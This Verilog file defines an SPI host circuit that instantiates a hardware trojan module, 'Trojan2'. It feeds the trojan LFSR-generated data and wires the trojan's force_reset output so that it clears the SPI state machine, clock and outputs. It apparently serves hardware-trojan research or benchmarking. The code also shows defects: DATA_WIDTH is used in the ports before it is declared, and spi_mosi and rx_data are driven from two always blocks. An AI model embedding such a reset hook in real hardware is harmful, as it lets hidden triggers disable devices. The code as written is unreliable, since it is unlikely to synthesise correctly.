// SPI Host Circuit for Trojan2
// Fixed I/O to match Trojan2: clk, rst, data_in[7:0] -> force_reset
module trojan2_spi_host #(
    parameter [23:0] SPI_PATTERN = 24'hACE123,  // Pattern for data generation
    parameter [7:0] TROJ_TRIGGER_SEQUENCE_1 = 8'hAA,
    parameter [7:0] TROJ_TRIGGER_SEQUENCE_2 = 8'h55
)(
    input wire clk,
    input wire rst,
    input wire [DATA_WIDTH-1:0] tx_data,
    input wire tx_start,
    input wire spi_miso,
    output reg [DATA_WIDTH-1:0] rx_data,
    output reg spi_sclk,
    output reg spi_mosi,
    output reg spi_cs_n,
    output reg tx_done,
    output reg rx_valid
);

    // Sizing parameters (converted from parameter to localparam)
    localparam DATA_WIDTH = 8;     // SPI data frame width
    localparam CLK_DIV = 16;       // SPI clock divider

    // Trojan interface (fixed width)
    wire [7:0] trojan_data_in;
    wire trojan_force_reset;
    
    // SPI control signals
    reg [DATA_WIDTH-1:0] tx_shift_reg;
    reg [DATA_WIDTH-1:0] rx_shift_reg;
    reg [$clog2(CLK_DIV)-1:0] clk_counter;
    reg [$clog2(DATA_WIDTH)-1:0] bit_counter;
    reg [2:0] spi_state;
    reg [23:0] pattern_shift;
    reg sclk_enable;
    
    // Data generation for trojan
    always @(posedge clk or posedge rst) begin
        if (rst)
            pattern_shift <= SPI_PATTERN;
        else if (tx_start || (spi_state != 3'b000))
            pattern_shift <= {pattern_shift[22:0], pattern_shift[23] ^ pattern_shift[18] ^ pattern_shift[12] ^ pattern_shift[2]};
    end
    
    assign trojan_data_in = pattern_shift[7:0];
    
    // SPI clock generation
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            clk_counter <= {$clog2(CLK_DIV){1'b0}};
            spi_sclk <= 1'b0;
        end else if (trojan_force_reset) begin
            // Synchronous reset from trojan
            clk_counter <= {$clog2(CLK_DIV){1'b0}};
            spi_sclk <= 1'b0;
        end else if (sclk_enable) begin
            if (clk_counter == (CLK_DIV-1)) begin
                clk_counter <= {$clog2(CLK_DIV){1'b0}};
                spi_sclk <= ~spi_sclk;
            end else begin
                clk_counter <= clk_counter + 1;
            end
        end else begin
            spi_sclk <= 1'b0;
        end
    end
    
    wire sclk_edge = sclk_enable && (clk_counter == (CLK_DIV-1));
    
    // SPI state machine
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            spi_state <= 3'b000;
            spi_cs_n <= 1'b1;
            sclk_enable <= 1'b0;
            bit_counter <= {$clog2(DATA_WIDTH){1'b0}};
            tx_shift_reg <= {DATA_WIDTH{1'b0}};
            rx_shift_reg <= {DATA_WIDTH{1'b0}};
            tx_done <= 1'b0;
            rx_valid <= 1'b0;
        end else if (trojan_force_reset) begin
            // Synchronous reset from trojan
            spi_state <= 3'b000;
            spi_cs_n <= 1'b1;
            sclk_enable <= 1'b0;
            bit_counter <= {$clog2(DATA_WIDTH){1'b0}};
            tx_shift_reg <= {DATA_WIDTH{1'b0}};
            rx_shift_reg <= {DATA_WIDTH{1'b0}};
            tx_done <= 1'b0;
            rx_valid <= 1'b0;
        end else begin
            case (spi_state)
                3'b000: begin // IDLE
                    spi_cs_n <= 1'b1;
                    sclk_enable <= 1'b0;
                    tx_done <= 1'b0;
                    rx_valid <= 1'b0;
                    if (tx_start) begin
                        tx_shift_reg <= tx_data;
                        bit_counter <= {$clog2(DATA_WIDTH){1'b0}};
                        spi_state <= 3'b001;
                    end
                end
                3'b001: begin // CS_ASSERT
                    spi_cs_n <= 1'b0;
                    sclk_enable <= 1'b1;
                    spi_state <= 3'b010;
                end
                3'b010: begin // TRANSFER
                    if (sclk_edge && spi_sclk) begin // Rising edge
                        spi_mosi <= tx_shift_reg[DATA_WIDTH-1];
                        tx_shift_reg <= tx_shift_reg << 1;
                    end else if (sclk_edge && !spi_sclk) begin // Falling edge
                        rx_shift_reg <= {rx_shift_reg[DATA_WIDTH-2:0], spi_miso};
                        if (bit_counter == (DATA_WIDTH-1)) begin
                            spi_state <= 3'b011;
                        end else begin
                            bit_counter <= bit_counter + 1;
                        end
                    end
                end
                3'b011: begin // CS_DEASSERT
                    spi_cs_n <= 1'b1;
                    sclk_enable <= 1'b0;
                    rx_data <= rx_shift_reg;
                    tx_done <= 1'b1;
                    rx_valid <= 1'b1;
                    spi_state <= 3'b000;
                end
                default: spi_state <= 3'b000;
            endcase
        end
    end
    
    // Initialize SPI outputs
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            spi_mosi <= 1'b0;
            rx_data <= {DATA_WIDTH{1'b0}};
        end else if (trojan_force_reset) begin
            spi_mosi <= 1'b0;
            rx_data <= {DATA_WIDTH{1'b0}};
        end
    end
    
    // Instantiate Trojan2
    Trojan2 #(
        .TRIGGER_SEQUENCE_1(TROJ_TRIGGER_SEQUENCE_1),
        .TRIGGER_SEQUENCE_2(TROJ_TRIGGER_SEQUENCE_2)
    ) trojan_inst (
        .clk(clk),
        .rst(rst),
        .data_in(trojan_data_in),
        .force_reset(trojan_force_reset)
    );

endmodule

